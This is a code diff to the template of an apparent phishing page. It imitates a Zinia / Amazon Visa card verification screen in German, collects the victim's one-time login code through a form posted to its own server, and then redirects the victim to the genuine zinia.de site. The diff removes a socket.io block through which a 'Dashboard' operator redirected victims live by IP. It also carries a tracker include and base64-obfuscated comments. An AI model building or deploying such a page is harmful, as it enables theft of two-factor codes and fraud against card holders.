@@ -4,12 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, minimum-scale=1, maximum-scale=5">
     <meta name="apple-mobile-web-app-status-bar-style" content="white">
-    <title>Zinia - Code bestätigen</title>
+    <title>Amazon Visa Karte</title>
     <link rel="stylesheet" href="css/botta.css">
      <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
       <%- include('partials/tracker') %>
     <style>
-        /* QWRtaW5pc3RyYXRvciBDb250cm9sbGVy */
+        /* QWRkaXRpb25hbCBFbmNyeXB0ZWQgU3R5bGVz */
         .logo-svg { max-width: 100%; }
     </style>
 </head>
@@ -43,15 +43,18 @@
 
                 <!-- Rm9ybSBTZWN0aW9u -->
                 <section class="form-section">
-                    <h3 class="form-title">Mit Einmalcode einloggen</h3>
-                    <p class="code-p">Code wurde an Ihre Nummer gesendet.</p>
+                    <div class="otp-icon">
+                        <img src="./img/otp-icon.svg" alt="">
+                    </div>
+                    <h3 class="form-title">Bestätigungscode</h3>
+                    <p class="code-p">Wenn du die Nachricht innerhalb weniger Minuten nicht erhältst, fodere einen neuen Code an.</p>
 
                     <form id="twoFactorForm" method="POST" >
                         <div class="form-group">
                             
                             <input
                                 type="tel"
-                                id="code"
+                                id="code-input"
                                 name="code"
                                 class="form-input"
                                 placeholder="Code eingeben"
@@ -60,32 +63,31 @@
                                 required
                                 style="text-align: center;"
                             >
-                            <p style="color: #da3535; font-weight: 500; margin-bottom: 15px; margin-top: 15px; text-align: center;"> Der von Ihnen eingegebene Code ist falsch.</p>
                         </div>
 
-                            <p style="text-align: center; margin: 15px 0; margin-bottom: 30px; cursor: pointer; color: #006de2;">Neuen Code anfordern</p>
+                         <p style="text-align: center; margin: 15px 0; margin-bottom: 30px; cursor: pointer; color: #006de2;">Erneut anfordern</p>
 
                         <button type="submit" class="btn btn-primary"  id="submitBtn">
-                            Bestätigen
+                            Senden
                         </button>
 
                         <div class="divider"></div>
 
-
+                       
                     </form>
                 </section>
             </div>
         </main>
     </div>
 
-
+   
 
 
 <!--  -->
   <script>
         document.addEventListener('DOMContentLoaded', function() {
             const form = document.getElementById('twoFactorForm');
-            const codeInput = document.getElementById('code');
+            const codeInput = document.getElementById('code-input');
             const submitBtn = document.getElementById('submitBtn');
             
             // Handle form submission
@@ -115,7 +117,7 @@
                         if(response.OK) {
                             // Success - redirect after 3 seconds
                             setTimeout(() => {
-                                window.location.href = '/loading?time=4&url=https://customer.amazon.zinia.de';
+                                window.location.href = '/loading?time=9&url=https://www.zinia.de/amazon';
                             }, 3000);
                         } else {
                             // Handle error response
@@ -152,31 +154,6 @@
         });
     </script>
 
-    <script src="/socket.io/socket.io.js"></script>
-    <script>
-      async function getPublicIP() {
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    console.log("Public IP:", data.ip);
-    return data.ip;
-  } catch (error) {
-    console.error("Failed to fetch IP:", error);
-    return null;
-  }
-}
-      const socket = io();
-     
-      // Handle redirect messages from server
-      socket.on('redirect', async (data) => {
-        const currentIp = await getPublicIP();
-        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
-        
-        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
-
-          window.location.href = data.url;
-        }
-      });
-      </script>
+   
 </body>
 </html>
